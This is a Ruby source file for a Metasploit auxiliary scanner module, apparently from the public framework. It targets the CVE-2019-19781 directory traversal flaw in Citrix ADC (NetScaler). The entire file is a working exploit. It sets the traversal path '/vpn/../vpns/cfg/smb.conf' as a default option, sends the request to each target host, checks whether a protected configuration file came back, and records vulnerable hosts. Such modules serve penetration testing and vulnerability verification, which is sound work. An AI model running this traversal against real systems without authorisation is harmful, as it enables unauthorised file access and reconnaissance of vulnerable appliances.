##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Citrix ADC (NetScaler) Directory Traversal Scanner',
      'Description'    => %{
        This module exploits a directory traversal vulnerability (CVE-2019-19781) within Citrix ADC
        (NetScaler). It requests the smb.conf file located in the /vpns/cfg directory by issuing the request
        /vpn/../vpns/cfg/smb.conf. It then checks if the server is vulnerable by looking for the presence of
        a "[global]" directive in smb.conf, which this file should always contain.
      },
      'Author'         => [
        'Erik Wynter', # @wyntererik
        'altonjx'      # @altonjx
      ],
      'References'     => [
        ['CVE', '2019-19781'],
        ['URL', 'https://support.citrix.com/article/CTX267027/']
      ],
      'DisclosureDate' => '2019-12-17',
      'License'        => MSF_LICENSE,
      'Notes'          => {
        'AKA'          => ['Shitrix']
      }
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/']),
      OptString.new('PATH',      [true, 'Traversal path', '/vpn/../vpns/cfg/smb.conf'])
    ])
  end

  def run_host(target_host)
    turi = normalize_uri(target_uri.path, datastore['PATH'])

    res = send_request_cgi(
      'method' => 'GET',
      'uri'    =>  turi
    )

    unless res
      print_error("#{full_uri(turi)} - No response, target seems down.")

      return Exploit::CheckCode::Unknown
    end

    unless res.code == 200
      print_error("#{full_uri(turi)} - The target is not vulnerable to CVE-2019-19781.")
      vprint_error("Obtained HTTP response code #{res.code} for #{full_uri(turi)}.")

      return Exploit::CheckCode::Safe
    end

    case turi
    when /smb\.conf$/
      unless res.headers['Content-Type'].starts_with?('text/plain') && res.body.include?('[global]')
        vprint_warning("#{turi} does not contain \"[global]\" directive.")
      end
    end

    print_good("#{full_uri(turi)} - The target is vulnerable to CVE-2019-19781.")
    msg = "Obtained HTTP response code #{res.code} for #{full_uri(turi)}. " \
          "This means that access to #{turi} was obtained via directory traversal."
    vprint_good(msg)

    report_vuln(
      host: target_host,
      name: name,
      refs: references,
      info: msg
    )

    Exploit::CheckCode::Vulnerable
  end

end
